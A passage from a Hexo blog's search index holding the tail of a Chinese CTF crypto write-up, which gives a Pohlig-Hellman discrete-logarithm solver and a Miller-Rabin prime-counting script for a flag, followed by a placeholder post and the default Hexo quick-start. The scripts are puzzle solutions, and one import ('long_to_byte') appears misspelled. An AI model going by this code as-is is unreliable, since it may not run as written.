class="hljs-built_in">print</span>(<span class="hljs-string">&quot;┌──────────────\n│Searching xi for &#123;&#125;\n└──────────────&quot;</span>.<span class="hljs-built_in">format</span>(factor[<span class="hljs-number">0</span>]))<br>    x_i_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(factor[<span class="hljs-number">1</span>]):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;------\nSearching for power &#123;&#125;\n------&quot;</span>.<span class="hljs-built_in">format</span>(i))<br>        <span class="hljs-keyword">if</span> i != <span class="hljs-number">0</span>:<br>            beta = (beta * <span class="hljs-built_in">pow</span>(g, -(x_i_list[-<span class="hljs-number">1</span>] * (factor[<span class="hljs-number">0</span>] ** (i - <span class="hljs-number">1</span>))), p)) % p<br>        <span class="hljs-keyword">else</span>:<br>            beta = h<br>        e1 = <span class="hljs-built_in">pow</span>(beta, (p-<span class="hljs-number">1</span>) // (factor[<span class="hljs-number">0</span>] ** (i + <span class="hljs-number">1</span>)), p)<br>        e2 = <span class="hljs-built_in">pow</span>(g, (p-<span class="hljs-number">1</span>) // factor[<span class="hljs-number">0</span>], p)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e2))<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> (<span class="hljs-built_in">range</span>(factor[<span class="hljs-number">0</span>])):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(e2, k, p) == e1:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;^&#123;&#125; = &#123;&#125; [p]&quot;</span>.<span class="hljs-built_in">format</span>(e1, k, e2))<br>                x_i_list.append(k)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(k))<br>                <span class="hljs-keyword">break</span><br>    x.append(x_i_list)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\nCreation of congruence system...&quot;</span>)<br>system = []<br><span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>    y = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j, x_j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(x[i]):<br>        y += x_j * (factor[<span class="hljs-number">0</span>] ** j)<br>    y = y % (factor[<span class="hljs-number">0</span>] ** factor[<span class="hljs-number">1</span>])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x = &#123;&#125; [p]&quot;</span>.<span class="hljs-built_in">format</span>(y))<br>    system.append(y)<br>    <br><br>result = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(factors)):<br>    p_i, e_i = factors[i]<br>    p_e = p_i ** e_i<br>    product = system[i]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(factors)):<br>        <span class="hljs-keyword">if</span> j == i:<br>            <span class="hljs-keyword">continue</span><br>        p_e_j = factors[j][<span class="hljs-number">0</span>] ** factors[j][<span class="hljs-number">1</span>]<br>        product *= p_e_j * <span class="hljs-built_in">pow</span>(p_e_j, -<span class="hljs-number">1</span>, p_e)<br>        product %= (p - <span class="hljs-number">1</span>)<br>    result += product<br>    result %= (p - <span class="hljs-number">1</span>)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\n┌──────────────\n│ x = &#123;&#125;\n└──────────────&quot;</span>.<span class="hljs-built_in">format</span>(result))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;   _____                                      </span><br><span class="hljs-string">  / ___/____ __________ _____  __  __________ </span><br><span class="hljs-string">  \__ \/ __ `/ ___/ __ `/ __ \/ / / / ___/ _ \\</span><br><span class="hljs-string"> ___/ / /_/ / /  / /_/ / /_/ / /_/ / /__/  __/</span><br><span class="hljs-string">/____/\__,_/_/   \__,_/ .___/\__,_/\___/\___/ </span><br><span class="hljs-string">                     /_/                       (dit le king)</span><br><span class="hljs-string">                     &quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>###4.cc的代码二<br>根据题意即求出以center值为中心，radius值为半径的范围内一共有多少素数。因为center值过大，根据文件中的暴力法破解显然跑不出来，考虑优化算法。（一开始我想的是用欧拉筛来找但是center值太大导致python列表容纳不下这么多数据，后面转念一想我铸币了）直接使用Miller_Rabin素性测试判断一个数是否为素数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>  long_to_byte<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_prime</span>(<span class="hljs-params">n, k=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    r = <span class="hljs-number">0</span><br>    d = n - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> d % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        r += <span class="hljs-number">1</span><br>        d //= <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>        a = random.randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">2</span>)<br>        x = <span class="hljs-built_in">pow</span>(a, d, n)<br><br>        <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> x == n - <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r - <span class="hljs-number">1</span>):<br>            x = <span class="hljs-built_in">pow</span>(x, <span class="hljs-number">2</span>, n)<br>            <span class="hljs-keyword">if</span> x == n - <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>center = <span class="hljs-number">865043906</span> &lt;&lt; <span class="hljs-number">64</span><br>radius = <span class="hljs-number">1145141</span><br>count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(center - radius, center + radius):<br>    <span class="hljs-keyword">if</span> is_prime(i):<br>        count += <span class="hljs-number">1</span><br>t=long_to_byte(count)<br>ans=t.decode()<br><span class="hljs-built_in">print</span>(ans)<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>My New Post</title>
    <link href="/2023/11/03/My-New-Post/"/>
    <url>/2023/11/03/My-New-Post/</url>
    
    <content type="html"><![CDATA[<p>1+1&#x3D;2</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/11/03/hello-world/"/>
    <url>/2023/11/03/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
